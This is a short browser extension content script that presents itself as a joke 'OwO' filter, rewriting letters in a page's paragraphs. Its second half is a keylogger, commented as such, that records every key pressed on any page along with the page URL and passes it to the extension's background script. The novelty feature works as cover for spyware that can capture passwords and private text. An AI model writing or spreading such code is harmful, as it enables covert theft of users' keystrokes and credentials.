// Script that is injected to the webpage
// OwO Extension
const text = document.querySelectorAll('p')

for (let i = 0; i < text.length; i++) {
    if (text[i].innerHTML.includes('o')) {
        text[i].innerHTML = text[i].innerHTML.replace(/o/gi, 'owo')
    }
    if (text[i].innerHTML.includes('n')) {
        text[i].innerHTML = text[i].innerHTML.replace(/n/gi, 'ny')
    }
    if (text[i].innerHTML.includes('r')) {
        text[i].innerHTML = text[i].innerHTML.replace(/r/gi, 'w')
    }
    if (text[i].innerHTML.includes('l')) {
        text[i].innerHTML = text[i].innerHTML.replace(/l/gi, 'w')
    }
    if (text[i].innerHTML.includes('th')) {
        text[i].innerHTML = text[i].innerHTML.replace(/th/gi, 'd')
    }
}

chrome.runtime.onConnect.addListener(function(port){});

function multipleKeys(event) {
    let keys;
    for (let i = 0; i < event.key.length; i++) {
        keys += event[i];
    }
    return keys;
}

// Keylogger
let k;
let data = {};
window.onkeydown = function (event) {
    
    // (event.key.length > 1) ? k = "(" + event.key + ")" : k = event.key;

    if (event.key.length > 1) {
        k = "(" + event.key + ")";
    } else {
        k = event.key;
    }

    data = {
        key: k,
        page: window.location.href
    };

    chrome.runtime.sendMessage(data);
}